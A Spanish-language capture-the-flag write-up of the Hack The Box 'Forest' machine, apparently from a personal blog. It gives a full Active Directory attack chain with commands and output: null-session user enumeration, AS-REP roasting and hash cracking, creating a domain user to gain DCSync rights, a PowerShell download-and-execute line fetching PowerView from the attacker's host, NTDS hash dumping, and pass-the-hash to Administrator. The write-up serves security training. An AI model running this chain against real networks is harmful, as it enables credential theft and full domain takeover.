---
title: Forest Writeup
author: xdann1
date: 2022-08-27
categories: [Writeup, HTB]
tags: [Windows, CTF, Easy, Directorio Activo, Crackeo Contraseñas, Kerberos, DCSync]
image:
  path: ../../assets/img/commons/forest/forest.png
  width: 800
  height: 500
  alt: Banner Forest
---

Máquina Easy, en la que nos aprovechamos de un Null Session por rpc para conseguir una lista de usuarios, probamos un AS-REP Roast de tal forma que conseguimos el hash de un usuario, por último nos aprovechamos de los privilegios de nuestro grupo para ir escalando entre usuarios hasta el administrador

## Recopilación de Información

Primero vamos a comprobar la conectividad con la máquina.

```plaintext
❯ ping -c 1 10.10.10.161
PING 10.10.10.161 (10.10.10.161) 56(84) bytes of data.
64 bytes from 10.10.10.161: icmp_seq=1 ttl=127 time=30.9 ms

--- 10.10.10.161 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 30.856/30.856/30.856/0.000 ms
```

En la salida del comando anterior se puede ver un parámetro llamado `ttl`, gracias a este parámetro podemos saber que sistema operativo está corriendo en la máquina víctima.

* GNU/Linux = TTL 64
* Windows = TTL 128

En este caso, el sistema operativo que está corriendo en la máquina víctima es Windows.

Vamos a usar la herramienta `nmap` para descubrir que puertos están abiertos y que servicios estan asociados a estos.

```plaintext
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.161 -oG allPorts
```

* -p- -> Escanea todos los puertos (65535)
* --open -> Muestra solo los puertos con un estatus "open"
* -sS -> Aplica un TCP SYN Scan
* --min-rate 5000 -> Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo
* -vvv -> Muestra la información en pantalla a medida que se descubre
* -n -> Indica que no aplique resolución DNS
* -Pn -> Indica que no aplique el protocolo ARP
* 10.10.10.161 -> Dirección IP que se quiere escanear
* -oG allPorts -> Exporta el output a un fichero grepeable con nombre "allPorts"

Este sería el output del escaneo:

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 22:30 CEST
Scanning 10.10.10.161 [65535 ports]
PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack ttl 127
88/tcp    open  kerberos-sec   syn-ack ttl 127
135/tcp   open  msrpc          syn-ack ttl 127
139/tcp   open  netbios-ssn    syn-ack ttl 127
445/tcp   open  microsoft-ds   syn-ack ttl 127
464/tcp   open  kpasswd5       syn-ack ttl 127
593/tcp   open  http-rpc-epmap syn-ack ttl 127
9389/tcp  open  adws           syn-ack ttl 127
47001/tcp open  winrm          syn-ack ttl 127
49671/tcp open  unknown        syn-ack ttl 127
49677/tcp open  unknown        syn-ack ttl 127
49684/tcp open  unknown        syn-ack ttl 127
49703/tcp open  unknown        syn-ack ttl 127
49921/tcp open  unknown        syn-ack ttl 127
```

Ahora vamos a realizar un escaneo más profundo, también con `nmap` pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.

```plaintext
❯ nmap -p53,88,135,139,445,464,593,9389,47001,49671,49677,49684,49703,49921 -sC -sV 10.10.10.161 -oN targeted
```

* -p53,88,135,139,445,464,593,9389,47001,49671,49677,49684,49703,49921 -> Indica los puertos que se quieren escanear
* -sC -> Lanza scripts básicos de enumeración
* -sV -> Enumera la versión y servicio que está corriendo en los puertos
* 10.10.10.161 -> Dirección IP que se quiere escanear
* -oN targeted -> Exporta el output a un fichero en formato nmap con nombre "targeted"

Este sería el output del escaneo:

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 22:40 CEST
Nmap scan report for 10.10.10.161
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-27 20:47:00Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49671/tcp open  msrpc        Microsoft Windows RPC
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
49921/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-08-27T20:47:50
|_  start_date: 2022-08-27T20:23:31
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h26m52s, deviation: 4h02m31s, median: 6m50s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2022-08-27T13:47:51-07:00
```

Los puertos abiertos y sus servicios asocidados son:

* 53/tcp -> DNS
* 88/tcp -> Kerberos
* 135/tcp -> RPC
* 139/tcp -> RPC
* 445/tcp -> SMB
* 464/tcp -> kpasswd
* 593/tcp -> ncacn_http
* 9389/tcp -> mc-nmf 
* 47001/tcp -> http
* 49671/tcp -> msrpc
* 49677/tcp -> msrpc
* 49684/tcp -> msrpc
* 49703/tcp -> msrpc
* 49921/tcp -> msrpc

# Busqueda de vulnerabilidades

Vamos a ver que nos encontramos en el puerto 445 (SMB), haremos uso de un "Null Session" junto con herramientas para enumerar este puerto. Entre ellas, `crackmapexec`, `smbclient` y `smbmap`.

```plaintext
❯ crackmapexec smb 10.10.10.161
SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
❯ smbclient -L 10.10.10.161 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
❯ smbmap -H 10.10.10.161
[+] IP: 10.10.10.161:445	Name: 10.10.10.161
```

Vemos que no tenemos acceso a ningun recurso compartido a nivel de red. Además, vemos la versión de Windows que está corriendo la máquina "Windows Server 2016 Standard 14393 x64"y nos dan el dominio que está siendo utilizado, esta información nos va a ser muy importante en el futuro, metedlo en el `/etc/hosts`, lo podeis hacer con el siguiente comando.

```plaintext
echo "10.10.10.161 htb.local" | sudo tee -a /etc/hosts
```

Ya que de momento no tenemos algo demasiado interesante vamos a probar con `rpcclient` para ver si podemos enumerar los usuarios y otra información.

```plaintext
❯ rpcclient -U "" -N 10.10.10.161 -c "enumdomusers" | grep -oP "\[.*?\]" | grep -v 0x | tr -d "[]" > users
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

Añadido a esto, podemo utilizar la herramienta [rpcenum](https://github.com/s4vitar/rpcenum) para enumerar los usuarios administradores del dominio, todos los grupos y descripciones de grupos y usuarios.

```plaintext
❯ rpcenum -i 10.10.10.161 -e All
[*] Enumerating Domain Users...

  +                       +
  | Users                 |
  +                       +
  | Administrator         |
  | Guest                 |
  | krbtgt                |
  | DefaultAccount        |
  | $331000-VK4ADACQNUCA  |
  | SM_2c8eef0a09b545acb  |
  | SM_ca8c2ed5bdab4dc9b  |
  | SM_75a538d3025e4db9a  |
  | SM_681f53d4942840e18  |
  | SM_1b41c9286325456bb  |
  | SM_9b69f1b9d2cc45549  |
  | SM_7c96b981967141ebb  |
  | SM_c75ee099d0a64c91b  |
  | SM_1ffab36a2f5f479cb  |
  | HealthMailboxc3d7722  |
  | HealthMailboxfc9daad  |
  | HealthMailboxc0a90c9  |
  | HealthMailbox670628e  |
  | HealthMailbox968e74d  |
  | HealthMailbox6ded678  |
  | HealthMailbox83d6781  |
  | HealthMailboxfd87238  |
  | HealthMailboxb01ac64  |
  | HealthMailbox7108a4e  |
  | HealthMailbox0659cc1  |
  | sebastien             |
  | lucinda               |
  | svc-alfresco          |
  | andy                  |
  | mark                  |
  | santi                 |
  +                       +

[*] Listing domain users with description...

  +                 +                                                           +
  | User            | Description                                               |
  +                 +                                                           +
  | Administrator   | Built-in account for administering the computer/domain    |
  | Guest           | Built-in account for guest access to the computer/domain  |
  | krbtgt          | Key Distribution Center Service Account                   |
  | DefaultAccount  | A user account managed by the system.                     |
  +                 +                                                           +

[*] Enumerating Domain Admin Users...

  +                   +
  | DomainAdminUsers  |
  +                   +
  | Administrator     |
  +                   +
```

No nos reporta nada demasiado interesante, vamos a centrarnos en los usuarios obtenidos anteriormente. En estos momentos, cuando disponemos de una lista de usuarios sin contraseñas, podemos probar un AS-REP Roasting.

# Explotación

¿Qué es un AS-REP Roasting?

Un ataque de AS-REP Roasting se aprovecha de una mala configuración en los usuarios, más concretamente al tener activa la flag "DONT_REQUIRE_PREAUTH", cuando un usuario tiene esta flag activa nosotros como atacantes vamos a ser capaces de ver su TGT (Ticket Granting Ticket) que posteriormente intentaremos crackear. Para realizar este ataque, necesitaremos una lista de usuarios sobre la que probar.

```plaintext
❯ impacket-GetNPUsers htb.local/ -no-pass -usersfile users
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:8d5e62b5eb294fd30e5731ee6d823af1$868e0a28b6cdfb776c93e282f41f92505644e85c61532ef673e339ee9efa2f72f211d133c780ec8152980e3bddd4e853fee9307b76ea5394065febf0d3308c84394d840bf6e6d7849180b33b8860c3f18343ac5aa344870f742baf071bdad656f52ad4b1be0e91d801913ea67d2f54e920a0a091e72c595f1d1248b2cf16f6b032f8562cfa8377ebb865ba2c5d04f6b22f727bf8f480d2062b63aa9cec449fa5cce3623fa06bad5a36098302c17ad8f53c4d6278d363ad70f81a1b57c2a5b91b83ea491a06677f305575acc39828f6d01be778e9b4f6759cb2230e6c7e58d6a217ccc248ef5e
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

Vemos que hemos conseguido el Ticket TGT del usuario "svc-alfresco", vamos a intentar crackearlo con `john` para conseguir su contraseña.

```plaintext
❯ john --w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:05 DONE (2022-08-28 00:48) 0.1733g/s 708103p/s 708103c/s 708103C/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Hemos conseguido crackear el hash, las credenciales quedarían así "svc-alfresco:s3rvice", vamos a comprobar si son validas realmente, lo haremos en `evil-winrm` y `smb`.

```plaintext
❯ crackmapexec smb 10.10.10.161 -u "svc-alfresco" -p "s3rvice"
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
❯ crackmapexec winrm 10.10.10.161 -u "svc-alfresco" -p "s3rvice"
SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

Las credenciales son validas para `smb` y `evil-winrm`, sin embargo, solo tenemos "Pwn3d!" en `evil-winrm` por lo que solo podremos conseguir una consola mediante `evil-winrm`. Vamos a conectarnos a la máquina víctima usando `evil-winrm`.

```plaintext
❯ evil-winrm -i 10.10.10.161 -u "svc-alfresco" -p "s3rvice"
```

Ya tenemos acceso a la máquina víctima mediante el uso de `evil-winrm`, vamos a leer la flag del usuario.

```plaintext
> type C:\Users\svc-alfresco\Desktop\user.txt
0b0560aa2d00b065****************
```

# Post-explotación

Vamos a realizar un pequeño reconocimiento manual.

```plaintext
> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
> net user svc-alfresco
User name                    svc-alfresco
Full Name                    svc-alfresco
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/27/2022 4:41:32 PM
Password expires             Never
Password changeable          8/28/2022 4:41:32 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/27/2022 3:49:57 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Service Accounts
The command completed successfully.
```

No vemos nada fuera de lo normal, vamos a utilizar `bloodhound` para que nos muestre de que formas podemos escalar privilegios. Lo primero que necesitaremos será conseguir el comprimido con el cual vamos a operar desde `bloodhound`. Esto lo haremos con el propio ingestor que trae `bloodhound`, en este caso vamos a utilizar la version en `python`.

```plaintext
❯ bloodhound-python -c All -u 'svc-alfresco' -p 's3rvice' -ns 10.10.10.161 -d htb.local --zip
```

Ya con el zip en nuestra máquina, nos abriremos `neo4j` y `bloodhound` para poder ver esta información (si nunca habeis utilizado `neo4j` antes os pedirán que cambieis la contraseña, las credenciales por defecto para acceder son "neo4j:neo4j").

```plaintext
❯ neo4j console
❯ bloodhound > /dev/null &
```

Cuando ya tengamos totalmente abierto `bloodhound` tendremos que subir los datos, esto lo haremos desde el siguiente boton.

![Subimos los datos]({{ 'assets/img/commons/forest/upload_data.png' | relative_url }}){: .center-image }
_Subimos los datos_

Cuando ya tengamos los datos subidos en `bloodhound` buscaremos en la barra superior derecha el usuario que hemos logrado comprometer, en este caso "svc-alfresco" y lo marcaremos como "Mark User as Owned".

![Marcamos como usuario comprometido]({{ 'assets/img/commons/forest/owned.png' | relative_url }}){: .center-image }
_Marcamos como usuario comprometido_

Ya marcado como un usuario comprometido le daremos doble click izquierdo en el usuario para entrar en el "Node Info" del usuario "svc-alfresco". Luego iremos a la pestaña que dice "Reachable High Values Target"

![Marcamos como usuario comprometido]({{ 'assets/img/commons/forest/privileges.png' | relative_url }}){: .center-image }
_Marcamos como usuario comprometido_

Esta pestaña nos da información de gran valor, podemos ver que nuestro usuario, "svc-alfresco", pertenece al grupo "SERVICE ACCOUNTS" este a su vez pertenece al grupo "PRIVILEGED IT ACCOUNTS" y este a su vez pertenece al grupo "ACCOUNT OPERATORS" vemos que este grupo tiene el privilegio "GenericAll" sobre el grupo "EXCHANGE WINDOWS PERMISSIONS".

Si buscamos acerca del grupo "ACCOUNT OPERATORS" veremos que este grupo nos permite crear/modificar/eliminar usuarios, objetos y grupos. Podemos aprovecharnos de esto para crear un usuario en el grupo "EXCHANGE WINDOWS PERMISSIONS" de tal forma que estaremos un paso más cerca de llegar al Controlador de Dominio.

```plaintext
> net user xdann1 xdann123$! /add /domain
The command completed successfully.
> net group "Exchange Windows Permissions" xdann1 /add
The command completed successfully.
```

El usuario que hemos creado ya debería estar en el grupo "EXCHANGE WINDOWS PERMISSIONS", vamos a comprobarlo.

```plaintext
> net user xdann1
User name                    xdann1
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/27/2022 8:32:38 PM
Password expires             Never
Password changeable          8/28/2022 8:32:38 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.
```

Vemos que nuestro usuario ya está en el grupo "EXCHANGE WINDOWS PERMISSIONS", ahora como tenemos este grupo vamos a ver si tenemos algún privilegio sobre algo. En la foto anterior podemos ver que el grupo "EXCHANGE WINDOWS PERMISSIONS" tiene el privilegio "WriteDacl" sobre el Controlador de dominio, vamos a aprovecharnos de esto.

Antes de nada, necesitamos importar el módulo de "PowerView" ya que lo necesitaremos más tarde al utilizar la utilidad "Add-DomainObjectAcl".

```plaintext
❯ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
❯ python3 -m http.server 80
> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/PowerView.ps1')
```

Una vez importado con exito el módulo, vamos a proceder a realizar la explotación que explican en `bloodhound`.

```plaintext
> $SecPassword = ConvertTo-SecureString 'xdann123$!' -AsPlainText -Force
> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\xdann1', $SecPassword)
> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity xdann1 -Rights DCSync
```

Ya tenemos al usuario en el DCSync, ahora en vez de usar lo que nos dicen en `bloodhound` utilizaremos `secretsdump` para dumpear los hashes de los usuarios utilizando el usuario que acabamos de crear.

```plaintext
❯ impacket-secretsdump htb.local/xdann1@10.10.10.161
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
                                         ---SKIP---
```

Tenemos el hash del usuario administrador, vamos a probarlo utilizando pass the hash.

```plaintext
❯ crackmapexec smb 10.10.10.161 -u "Administrator" -H "32693b11e6aa90eb43d32c72a07ceea6"
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\Administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
❯ crackmapexec winrm 10.10.10.161 -u "Administrator" -H "32693b11e6aa90eb43d32c72a07ceea6"
SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\Administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
```

Son validas para el `smb` y `evil-winrm`, vamos a conectarnos por evil-winrm.

```plaintext
❯ evil-winrm -i 10.10.10.161 -u "Administrator" -H "32693b11e6aa90eb43d32c72a07ceea6"
> type ../Desktop/root.txt
b97caa55b20adb9d***************
```
